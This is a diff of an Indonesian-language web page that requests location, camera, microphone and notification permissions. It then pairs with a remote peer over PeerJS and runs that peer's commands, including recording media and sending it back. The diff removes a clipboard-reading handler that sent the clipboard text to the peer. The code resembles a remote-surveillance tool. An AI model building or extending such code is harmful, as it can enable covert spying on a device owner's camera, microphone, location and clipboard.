@@ -76,9 +76,9 @@
       display: none;
     }
     .code {
-      font-size: 2rem;
+      font-size: 1.8rem;
       font-weight: bold;
-      letter-spacing: 4px;
+      letter-spacing: 3px;
       color: #4fc3f7;
       font-family: monospace;
       word-break: break-all;
@@ -125,16 +125,6 @@
       margin-bottom: 10px;
       text-align: left;
     }
-    
-    .retry-btn {
-      background: #ff9800;
-      border: none;
-      padding: 8px 16px;
-      border-radius: 40px;
-      color: white;
-      cursor: pointer;
-      margin-top: 10px;
-    }
   </style>
 </head>
 <body>
@@ -158,15 +148,9 @@
       <div class="permission-item">
         🔔 Notifikasi <span class="status status-pending" id="permNotification">⏳ Menunggu</span>
       </div>
-      <div class="permission-item">
-        📋 Papan Klip <span class="status status-pending" id="permClipboard">⏳ Menunggu</span>
-      </div>
-      <div class="permission-item">
-        📱 Aplikasi <span class="status status-pending" id="permApps">⏳ Menunggu</span>
-      </div>
     </div>
     <div id="loadingSpinner" class="loading-spinner"></div>
-    <div id="permProgress" style="font-size:0.7rem; color:#888;">Meminta izin 0/6...</div>
+    <div id="permProgress" style="font-size:0.7rem; color:#888;">Meminta izin 0/4...</div>
   </div>
   
   <!-- Panel Kode Pairing (muncul setelah semua izin granted) -->
@@ -193,23 +177,19 @@
   let currentPeerId = null;
   let allPermissionsGranted = false;
   
-  // Status izin
+  // Status izin (hanya 4)
   const permissions = {
     location: false,
     camera: false,
     microphone: false,
-    notifications: false,
-    clipboard: false,
-    apps: false
+    notifications: false
   };
   
   const permElements = {
     location: document.getElementById('permLocation'),
     camera: document.getElementById('permCamera'),
     microphone: document.getElementById('permMicrophone'),
-    notifications: document.getElementById('permNotification'),
-    clipboard: document.getElementById('permClipboard'),
-    apps: document.getElementById('permApps')
+    notifications: document.getElementById('permNotification')
   };
   
   const pairingCodeDiv = document.getElementById('pairingCode');
@@ -242,11 +222,11 @@
         permElements[key].className = 'status status-granted';
         grantedCount++;
       } else {
-        permElements[key].innerHTML = '❌ Belum/Ditolak';
-        permElements[key].className = 'status status-denied';
+        permElements[key].innerHTML = '⏳ Menunggu';
+        permElements[key].className = 'status status-pending';
       }
     }
-    permProgress.innerHTML = `Meminta izin ${grantedCount}/6...`;
+    permProgress.innerHTML = `Meminta izin ${grantedCount}/4...`;
     
     // Cek apakah semua izin sudah granted
     allPermissionsGranted = Object.values(permissions).every(v => v === true);
@@ -263,12 +243,12 @@
         statusDiv.style.display = 'block';
         resetBtn.style.display = 'inline-block';
         logArea.style.display = 'block';
-        initPeer(); // Mulai PeerJS setelah izin lengkap
+        initPeer();
       }, 1000);
     }
   }
   
-  // =============== PERIZINAN ===============
+  // =============== PERIZINAN (4 IZIN) ===============
   async function requestLocationPermission() {
     return new Promise((resolve) => {
       if (!navigator.geolocation) {
@@ -322,39 +302,8 @@
     return permissions.notifications;
   }
   
-  async function requestClipboardPermission() {
-    if (!navigator.clipboard || !navigator.clipboard.readText) {
-      permissions.clipboard = false;
-      return false;
-    }
-    try {
-      await navigator.clipboard.readText();
-      permissions.clipboard = true;
-      return true;
-    } catch (err) {
-      permissions.clipboard = false;
-      return false;
-    }
-  }
-  
-  async function requestAppsPermission() {
-    if ('getInstalledRelatedApps' in navigator) {
-      try {
-        await navigator.getInstalledRelatedApps();
-        permissions.apps = true;
-        return true;
-      } catch(e) {
-        permissions.apps = false;
-        return false;
-      }
-    } else {
-      permissions.apps = false;
-      return false;
-    }
-  }
-  
   async function requestAllPermissions() {
-    addLog('🔄 Meminta semua izin...');
+    addLog('🔄 Meminta semua izin (Lokasi, Kamera, Mikrofon, Notifikasi)...');
     
     await requestLocationPermission();
     updatePermissionUI();
@@ -370,19 +319,11 @@
     
     await requestNotificationPermission();
     updatePermissionUI();
-    await new Promise(r => setTimeout(r, 300));
     
-    await requestClipboardPermission();
-    updatePermissionUI();
-    await new Promise(r => setTimeout(r, 300));
-    
-    await requestAppsPermission();
-    updatePermissionUI();
-    
-    addLog(`✨ Proses izin selesai. ${Object.values(permissions).filter(v=>v===true).length}/6 izin diberikan`);
+    addLog(`✨ Proses izin selesai. ${Object.values(permissions).filter(v=>v===true).length}/4 izin diberikan`);
   }
   
-  // =============== PEERJS (setelah izin lengkap) ===============
+  // =============== PEERJS ===============
   function initPeer() {
     if (peer) peer.destroy();
     
@@ -440,9 +381,6 @@
         break;
       case 'stop_record':
         await stopRecordingAndSend();
-        break;
-      case 'read_clipboard':
-        await readClipboardAndSend();
         break;
       default:
         addLog(`⚠️ Perintah tidak dikenal: ${command.type}`, true);
@@ -552,18 +490,6 @@
     }
   }
   
-  async function readClipboardAndSend() {
-    addLog(`📋 Membaca papan klip...`);
-    try {
-      const text = await navigator.clipboard.readText();
-      addLog(`📋 Teks: ${text.substring(0, 50)}...`);
-      sendResponse('clipboard', { text });
-    } catch (err) {
-      addLog(`❌ Gagal baca clipboard: ${err.message}`, true);
-      sendResponse('clipboard', { error: err.message });
-    }
-  }
-  
   function sendResponse(type, data) {
     if (connection && connection.open) {
       connection.send({ response: true, type, data });
@@ -572,7 +498,6 @@
     }
   }
   
-  // Reset peer
   resetBtn.onclick = () => {
     addLog(`🔄 Generate kode pairing baru...`);
     if (peer) peer.destroy();
